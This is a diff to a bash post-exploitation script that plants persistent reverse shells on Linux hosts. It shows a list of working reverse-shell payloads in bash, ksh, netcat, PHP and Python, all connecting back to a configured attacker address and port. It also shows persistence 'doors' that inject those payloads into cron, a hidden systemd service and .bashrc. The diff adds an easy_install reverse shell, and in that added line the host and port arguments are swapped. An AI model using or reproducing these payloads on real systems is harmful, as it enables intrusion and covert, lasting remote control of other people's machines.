@@ -9,6 +9,7 @@
 attackBox=0.0.0.0
 attackPort=5253
 cron="* * * * *"
+EZID=$(mktemp -d)
 
 touch /dev/shm/.linpay
 
@@ -19,6 +20,7 @@ methods=(
 	# NOTE: the eval statement is meant to account for the times where you can execute a command, therefore the exit status = 0 but the command itself prevents you from doing what you want (e.g. you can excute easy_install as any user but only install things as root [by default], and you can install a persistence script)
 	# payload = just the bare minimum to run the reverse shell, the extra needed to install the payload somewhere (e.g. cron schedule) is handled in "doors"
 	"bash , if bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
+	"easy_install , if echo 'import sys,socket,os,pty;exit()' > $EZID/setup.py; easy_install $EZID 2> /dev/null &> /dev/null , echo 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"attackPort\"),int(os.getenv(\"attackBox\"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(\"$SHELL\")' > $EZID/setup.py; easy_install $EZID:"
 	"ksh , if ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	"nc , if $(nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null) , nc $attackBox $attackPort -e $SHELL:"
 	"php , if php -r \"exit();\" , php -r \"set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"ERROR Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip \$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }:"
@@ -27,6 +29,7 @@ methods=(
 	"python2.7 , if python2.7 -c 'import socket,subprocess,os;exit()' , python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
 	"python3 , if python3 -c 'import socket,subprocess,os;exit()' , python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
 	"python3.8 , if python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);':"
+
 )
 
 doors=(
@@ -38,6 +41,17 @@ doors=(
 	"systemctl , if find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
 	"bashrc , if cd;find -writable -name .bashrc | grep -qi bashrc , echo \"$(cat /dev/shm/.linpay) 2> /dev/null & sleep .0001\" >> ~/.bashrc"
 )
+
+#TF=$(mktemp -d)
+#echo 'import sys,socket,os,pty;s=socket.socket()
+#s.connect((os.getenv("attackPort"),int(os.getenv("attackBox"))))
+#[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+#pty.spawn("/bin/sh")' > $TF/setup.py
+#easy_install $TF
+#
+#TF=$(mktemp -d)
+#echo 'import sys,socket,os,pty;exit()' > $TF/setup.py
+#easy_install $TF
 
 # pass paylod to doors
 enum_methods() {
@@ -104,12 +118,6 @@ enum_doors() {
 }
 
 sudo_hijack_attack () {
-	if $(sudo -l | grep -qi NOPASSWD);
-	then
-		echo -e "\e[92m[+]\e[0m Sudo NOPASSWD Attack Possible for the Following Commands"
-		sudo -l | grep NOPASSWD | awk -F ': ' '{print $2}'
-		echo "-----------------------"
-	fi
 	if $(cat /etc/group | grep sudo | grep -qi $(whoami));
 	then
 		echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
